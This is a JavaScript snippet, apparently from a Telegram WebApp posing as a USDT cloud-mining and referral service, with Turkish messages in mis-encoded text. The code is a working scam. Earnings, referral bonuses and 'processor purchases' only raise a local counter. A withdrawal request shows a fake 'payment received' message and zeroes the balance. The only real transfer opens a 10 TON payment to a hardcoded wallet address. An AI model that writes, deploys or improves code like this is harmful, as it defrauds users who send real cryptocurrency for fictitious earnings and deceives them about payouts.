  <script>
    let usdt = 0;
    let referrals = 0;
    let miningActive = false;

    function startMining() {
      if (miningActive) return;
      miningActive = true;
      document.getElementById("mineBtn").disabled = true;
      setInterval(() => {
        const earned = 0.000150;
        usdt += earned;
        updateBalance();
      }, 1000);
    }

    function share() {
      if (referrals < 100) {
        referrals++;
        if (referrals % 10 === 0 && referrals <= 100) {
          const bonus = 5;
          usdt += bonus;
          showNotification(`${referrals} kiÅŸi davet ettin! +${bonus} USDT bonus kazandÄ±n!`);
        }
        updateBalance();
        document.getElementById("refCount").textContent = referrals;
      }
    }

    function requestWithdrawal() {
      if (usdt >= 800) {
        showNotification(`Ã–deme talebiniz alÄ±ndÄ±. 24 saat iÃ§inde iÅŸlenecek. Toplam: ${usdt.toFixed(5)} USDT`);
        usdt = 0;
        updateBalance();
      } else {
        showNotification("Ã–deme talebi iÃ§in en az 800 USDT gereklidir.");
      }
    }

    function buyProcessor(amount) {
      usdt += amount;
      updateBalance();
      showNotification(`${amount} USDT'lik iÅŸlemci satÄ±n alÄ±ndÄ±, kazanÃ§ eklendi.`);
    }

    function payWithTelegramWallet() {
      const tonAmount = 10;
      const tonAddress = "UQDyN-f4ZUbC0RT_RgW0IcwAxWy48Nbvw05TgWSi4Nhv2aOe";
      const walletUrl = `https://t.me/wallet?startapp=transfer_ton-${tonAddress}-${tonAmount}`;
      window.open(walletUrl, "_blank");
    }

    function showNotification(message) {
      const note = document.getElementById("notification");
      note.textContent = message;
      note.style.display = "block";
      setTimeout(() => {
        note.style.display = "none";
      }, 5000);
    }

    function updateBalance() {
      document.getElementById("usdtBalance").textContent = usdt.toFixed(5);
      document.getElementById("walletUsdt").textContent = usdt.toFixed(5);
      if (window.Telegram.WebApp) {
        Telegram.WebApp.sendData(JSON.stringify({ usdt, referrals }));
      }
    }

    function toggleWalletPopup() {
      const popup = document.getElementById("walletPopup");
      popup.style.display = popup.style.display === "none" ? "block" : "none";
    }

    Telegram.WebApp.ready();
  </script>
